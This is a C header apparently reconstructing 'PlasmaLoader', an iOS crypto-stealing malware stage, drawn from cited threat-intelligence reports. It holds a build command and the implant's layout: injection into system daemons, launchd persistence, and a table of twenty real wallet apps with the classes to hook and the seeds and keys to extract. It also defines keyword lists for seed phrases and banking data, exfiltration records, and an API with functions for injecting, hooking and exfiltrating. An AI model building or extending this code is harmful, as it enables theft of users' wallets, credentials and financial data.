/*
 * PlasmaLoader (PLASMAGRID) - Coruna Stage 6 Payload
 *
 * Stager bundle ID: com.apple.assistd (GTIG IOC, sha256 2a9d21ca0724...).
 * Injects into the powerd daemon (a root process - not a bundle ID).
 * Modules use com.plasma.* naming internally. Persists across app
 * relaunches (does not survive reboot; revisit-to-reinfect model).
 *
 * Recovered mijieqi builds (type-0x07 secondary, on disk):
 *   800d80e0...min.js -> SamplePayload sha256 9a75a90a92786f75...
 *   4817ea80...min.js -> SamplePayload sha256 9147e1737e6908dd...
 *   captures/macho/plasmagrid/SamplePayload_*.dylib
 *
 *   Stage 2  73b26374...min.js -> powerd   (/usr/local/lib/SamplePayload.dylib)
 *   Stage 3  new.js           -> locationd (/usr/local/lib/CorePayload.dylib)
 *                                          = "CorePayload", orchestrator
 *   sms.js                    -> imagent   (libSMSBroadcast.dylib)
 *                                          takes over C2, with an
 *                                          SMS/iMessage BACKUP channel
 *   helion.js                 -> SpringBoard (@rpath/helion.dylib)
 *                                          hooks every app launch;
 *                                          helion_ipc_handler threads in
 *                                          locationd + SpringBoard IPC
 *
 * Forensic artifact (iVerify): /private/var/mobile/Library/Preferences/
 * com.apple.photolibraryd.plist - persistent, survives into encrypted
 * iTunes backup (Manifest.db fileID 98be59db...); "does not normally
 * exist on iOS".
 *
 * Source: GTIG + iVerify technical blog (March 2026)
 * Reverse engineering notes: Coruna 0x08 implant persists in powerd
 * via launchd, then this payload layer performs:
 *   1. Crypto wallet hooking (18+ apps; GTIG module table:
 *      io.metamask.MetaMask, app.phantom, com.bitkeep.os,
 *      com.trustwallet.app, exodus, tronlink, ...)
 *   2. Apple Notes BIP39 seed phrase scanning
 *   3. Keyword scanning (bank account, recovery, etc.)
 *   4. Clipboard interception via UIPasteboard
 *   5. C2 exfiltration: config from http://<C2>/details/show.html,
 *      7-ZIP password-protected modules, AES keyed by SHA256 of a
 *      static string; DGA fallback seed "lazarus" -> 15-char .xyz
 *      domains (27 C2s), validated via Google DNS
 *
 * Build (iOS arm64e):
 *   xcrun -sdk iphoneos clang -arch arm64e -O2 -framework Foundation \
 *       -framework UIKit -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
 *       -I../include -DPLASMALOADER_STANDALONE \
 *       coruna_plasmaloader.c -o coruna_plasmaloader
 */
#ifndef CORUNA_PLASMALOADER_H
#define CORUNA_PLASMALOADER_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

/* ---- Configuration ---- */
#define PLASMALOADER_STAGER_BUNDLE    "com.apple.assistd"  /* GTIG IOC */
#define PLASMALOADER_DAEMON_NAME      "powerd"             /* injection target process */
#define PLASMALOADER_PERSIST_LABEL    "com.apple.assistd"
#define PLASMALOADER_COREPAYLOAD_DYLIB "/usr/local/lib/CorePayload.dylib" /* locationd, iVerify */
#define PLASMALOADER_SMS_DYLIB        "libSMSBroadcast.dylib"            /* imagent, iVerify */
#define PLASMALOADER_HELION_DYLIB     "@rpath/helion.dylib"             /* SpringBoard, iVerify */
#define PLASMALOADER_C2_CONFIG_PATH   "/details/show.html"               /* GTIG */
#define PLASMALOADER_DGA_SEED         "lazarus"                           /* GTIG */
#define PLASMALOADER_BEACON_INTERVAL  3600
#define PLASMALOADER_C2_TIMEOUT       30
#define PLASMALOADER_MAX_WALLETS      32
#define PLASMALOADER_MAX_KEYWORDS    64

/* ---- Wallet bundle IDs (from GTIG analysis) ---- */
typedef struct {
    const char *bundle_id;
    const char *hook_class;
    uint32_t    extract_flags;
} coruna_wallet_target_t;

#define CORUNA_EXTRACT_SEED       0x01
#define CORUNA_EXTRACT_PRIVATE    0x02
#define CORUNA_EXTRACT_ADDRESS    0x04
#define CORUNA_EXTRACT_MNEMONIC   0x08
#define CORUNA_EXTRACT_API_KEY    0x10
#define CORUNA_EXTRACT_OAUTH      0x20

static const coruna_wallet_target_t CORUNA_WALLET_TARGETS[] = {
    {"io.metamask.MetaMask",         "MMSecureKeychainController", CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE | CORUNA_EXTRACT_ADDRESS},
    {"app.phantom",                  "PHKeychain",                  CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE | CORUNA_EXTRACT_ADDRESS},
    {"com.bitkeep.wallet",           "BKBIP39Manager",              CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"com.trustwallet.app",          "TWKeyStore",                  CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE | CORUNA_EXTRACT_ADDRESS},
    {"com.coinbase.wallet",          "CBWalletStore",               CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_OAUTH},
    {"com.binance.dev",              "BinanceWallet",               CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_API_KEY},
    {"io.exodus.alwayson",           "EXKeyStore",                  CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"com.myetherwallet",            "MEWKeyStore",                 CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"io.argent.web",                "ArgentKeyStore",              CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE},
    {"com.coinomi.wallet",           "CoinomiWallet",               CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"org.toshi",                    "ToshiKeychain",               CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE},
    {"com.ledger.live",              "LKeychain",                   CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE},
    {"com.trezor.suite",             "TrezorKeychain",              CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE},
    {"com.tangem.wallet",            "TangemWalletKeyStore",        0},
    {"io.enjin.wallet",              "EnjinKeyStore",               CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"com.cakewallet.cake",          "CakeKeyStore",                CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"com.monarch.money",            "MonarchKeyStore",             CORUNA_EXTRACT_SEED},
    {"io.unchained.bitcoin",         "UnchainedKeyStore",           CORUNA_EXTRACT_SEED | CORUNA_EXTRACT_PRIVATE},
    {"com.bluewallet.bluewallet",    "BlueWalletKeyStore",          CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
    {"com.greenaddress.greenbits",   "GreenAddressKeyStore",        CORUNA_EXTRACT_MNEMONIC | CORUNA_EXTRACT_PRIVATE},
};

#define CORUNA_WALLET_COUNT (sizeof(CORUNA_WALLET_TARGETS) / sizeof(CORUNA_WALLET_TARGETS[0]))

/* ---- BIP39 keyword scanner ---- */
static const char *CORUNA_BIP39_KEYWORDS[] = {
    "mnemonic", "seed phrase", "recovery phrase", "secret recovery",
    "backup phrase", "twelve words", "24 words", "12 words",
    "BIP39", "BIP-39",
};
#define CORUNA_BIP39_KEYWORD_COUNT (sizeof(CORUNA_BIP39_KEYWORDS) / sizeof(CORUNA_BIP39_KEYWORDS[0]))

/* ---- Financial keyword scanner ---- */
static const char *CORUNA_FINANCIAL_KEYWORDS[] = {
    "bank account", "routing number", "SWIFT", "IBAN",
    "credit card", "social security", "SSN", "passport",
    "wire transfer", "account number", "sort code",
};
#define CORUNA_FINANCIAL_KEYWORD_COUNT (sizeof(CORUNA_FINANCIAL_KEYWORDS) / sizeof(CORUNA_FINANCIAL_KEYWORDS[0]))

/* ---- Exfiltrated data record ---- */
typedef struct {
    uint32_t    type;
    uint32_t    flags;
    const char *bundle_id;
    size_t      data_len;
    uint8_t    *data;
    uint64_t    timestamp;
} coruna_exfil_record_t;

#define CORUNA_EXFIL_SEED         0x01
#define CORUNA_EXFIL_PRIVATE_KEY  0x02
#define CORUNA_EXFIL_ADDRESS      0x03
#define CORUNA_EXFIL_MNEMONIC     0x04
#define CORUNA_EXFIL_API_KEY      0x05
#define CORUNA_EXFIL_CLIPBOARD    0x06
#define CORUNA_EXFIL_NOTE         0x07
#define CORUNA_EXFIL_KEYWORD      0x08

/* ---- Public API ---- */
typedef struct {
    int      (*init)(void);
    int      (*inject_powerd)(void);
    int      (*install_persistence)(void);
    int      (*hook_wallets)(void);
    int      (*scan_notes)(void);
    int      (*scan_clipboard)(void);
    int      (*exfiltrate)(const coruna_exfil_record_t *rec);
    void     (*shutdown)(void);
} coruna_plasmaloader_ops_t;

extern const coruna_plasmaloader_ops_t *coruna_plasmaloader_get_ops(void);

#endif /* CORUNA_PLASMALOADER_H */
